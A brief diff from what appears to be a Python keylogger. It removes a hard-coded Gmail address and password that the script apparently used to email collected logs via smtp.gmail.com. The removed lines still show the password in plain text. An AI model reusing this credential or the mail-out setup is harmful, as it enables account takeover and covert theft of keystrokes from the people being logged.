@@ -10,8 +10,8 @@ log_path = 'C:\\Logger\output.txt'
 
 mail = smtplib.SMTP('smtp.gmail.com', 587)
 msg = MIMEMultipart()
-address = 'schimberglogcollector@gmail.com'
-password = 'GkcmeXyuv33mzu'
+address = ''
+password = ''
 
 #This seemed like the easiest way to implement a timer.
 while True:
